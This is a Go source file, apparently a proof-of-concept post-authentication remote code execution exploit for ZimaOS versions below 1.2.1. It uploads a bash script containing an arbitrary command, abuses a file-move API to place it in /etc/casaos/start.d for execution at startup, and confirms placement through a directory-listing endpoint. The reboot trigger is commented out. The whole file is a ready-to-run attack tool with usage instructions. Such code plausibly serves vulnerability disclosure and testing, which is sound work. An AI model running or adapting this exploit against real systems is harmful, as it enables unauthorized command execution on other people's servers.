package main

import (
	"bytes"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"log/slog"
	"mime/multipart"
	"net/http"
	"net/textproto"
	"net/url"
	"os"
	"strings"
)

type Host struct {
	Address string
	Token   string
}

func main() {
	os.Setenv("HTTP_PROXY", "http://127.0.0.1:8080")
	if len(os.Args) != 4 {
		log.Println("Wrong number of arguments")
		usage()
		os.Exit(1)
	}

	_, err := url.Parse(os.Args[1])
	if err != nil {
		log.Fatalln("Invalid address provided")
	}
	host := new(Host)
	host.Address = os.Args[1]
	host.Token = os.Args[2]

	command := os.Args[3]

	// Step 1: Uploading to an intended location
	slog.Info("Uploading file")
	uploadPath := "/media/ZimaOS-HD/Downloads"
	payloadFile, err := host.UploadFile(command, uploadPath)
	if err != nil {
		log.Fatalln("Error while uploading file", err)
	}
	slog.Info("Payload correctly uploaded", "file", payloadFile)

	// Step 2: Moving the file to /etc/casaos/start.d to execute commands
	slog.Info("Moving file to /etc/casaos/start.d")
	err = host.MoveFile(uploadPath+"/"+payloadFile, "/etc/casaos/start.d")
	if err != nil {
		log.Fatal("Error while moving file", err)
	}

	// Step 3: Verifying the file is in the correct location with the directory listing
	slog.Info("Checking if the payload has been correctly moved")
	err = host.SearchInDirectory("/etc/casaos/start.d", payloadFile)
	if err != nil {
		log.Fatalln("Error while serching for file in /etc/casaos/start.d", err)
	}
	// Step 4: Rebooting
	slog.Info("File moved successfully, rebooting the host")
	//err = host.Reboot()
	//if err != nil {
	//	log.Fatalln("Error during reboot process", err)
	//}
}

func (host *Host) Reboot() error {
	rebootEndpoint := "/v1/sys/state/restart"
	client := &http.Client{}
	r, _ := http.NewRequest("PUT", host.Address+rebootEndpoint, nil)
	r.Header.Add("Authorization", host.Token)
	resp, err := client.Do(r)
	if err != nil {
		return err
	}
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("wrong status code received, expecting 200 got %d", resp.StatusCode)
	}
	return nil
}

// This function uses the Directory listing vulnerability to check if the file has been successfully moved
func (host *Host) SearchInDirectory(directory string, filename string) error {
	directoryListingEndpoint := "/v2_1/files/file"

	client := &http.Client{}
	r, _ := http.NewRequest("GET", host.Address+"/"+directoryListingEndpoint+"?path="+directory, nil)
	r.Header.Add("Authorization", host.Token)
	resp, err := client.Do(r)
	if err != nil {
		return err
	}
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("wrong status code received, expecting 200 got %d", resp.StatusCode)
	}

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	if strings.Contains(string(bodyBytes), filename) {
		return nil
	}

	return fmt.Errorf("unable to find the file in /etc/casaos/start.d")

}

// This function exploits the ability to move files arbitrarily in the filesystem
// to move the payload to /etc/casaos/start.d
func (host *Host) MoveFile(from string, to string) error {
	copyEndpoint := "/v2_1/files/task"

	body := strings.NewReader("{\"to\":\"" + to + "\",\"type\":\"move\",\"item\":[{\"from\":\"" + from + "\"}]}")
	r, _ := http.NewRequest("POST", host.Address+copyEndpoint, body)
	r.Header.Add("Authorization", host.Token)
	// The content type is mandatory
	r.Header.Add("Content-Type", "application/json")
	client := &http.Client{}
	resp, err := client.Do(r)
	if err != nil {
		return err
	}
	if resp.StatusCode != 200 {
		return fmt.Errorf("wrong status code received, expecting 200 got %d", resp.StatusCode)
	}
	return nil
}

func (host *Host) UploadFile(command string, to string) (string, error) {
	payload := `#!/bin/bash
%s`

	uploadEndpoint := "/v2_1/files/file/upload"

	payloadFile := genRandomString(10)

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	writer.SetBoundary("----WebKitFormBoundarytKvmLJ9qJEAf7ZHe")

	AddGenericPart(writer, "chunkNumber", "1")
	AddGenericPart(writer, "chunkSize", "10485760")
	AddGenericPart(writer, "currentChunkSize", "0")
	AddGenericPart(writer, "totalSize", "0")
	AddGenericPart(writer, "identifier", "0-testtxt")
	AddGenericPart(writer, "filename", payloadFile)
	AddGenericPart(writer, "relativePath", payloadFile)
	AddGenericPart(writer, "totalChunks", "1")
	AddGenericPart(writer, "path", to)
	AddFilePart(writer, "file", fmt.Sprintf(payload, command), payloadFile)
	writer.Close()

	r, _ := http.NewRequest("POST", host.Address+uploadEndpoint, body)
	r.Header.Add("Authorization", host.Token)
	r.Header.Add("Content-Type", writer.FormDataContentType())
	client := &http.Client{}
	resp, err := client.Do(r)
	if err != nil {
		return "", err
	}
	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("wrong status code received, expecting 200 got %d", resp.StatusCode)
	}
	return payloadFile, nil
}

func usage() {
	fmt.Println(" === Post Auth RCE for ZimaOS < 1.2.1\nNOTE: the instance will be rebooted ===")
	fmt.Println("Usage: ./zimaos-postauth-rce [protocol://host:port] [auth token] [command]")
	fmt.Println("Example: ./zimaos-postauth-rce 'https://10.10.10.1:8484' 'eyJpdiI6IlY3WlpE...' 'ls'")
}

// Create generic multipart part
func AddGenericPart(writer *multipart.Writer, partName string, content string) {
	header := textproto.MIMEHeader{}
	header.Set("Content-Disposition", "form-data; name=\""+partName+"\"")

	part, err := writer.CreatePart(header)
	if err != nil {
		panic(err)
	}
	part.Write([]byte(content))
}

// Create the multipart relative to the file content
// It needs the filename parameter to the Content-Disposition header
// and the additional header Content-Type: "text/plain"
func AddFilePart(writer *multipart.Writer, partName string, content string, filename string) {
	header := textproto.MIMEHeader{}
	header.Set("Content-Disposition", "form-data; name=\""+partName+"\"; filename=\""+filename+"\"")
	header.Set("Content-Type", "text/plain")
	part, err := writer.CreatePart(header)
	if err != nil {
		panic(err)
	}
	part.Write([]byte(content))
}

func genRandomString(n int) string {
	b := make([]byte, n)
	rand.Read(b)

	return base64.URLEncoding.EncodeToString(b)[:n]
}
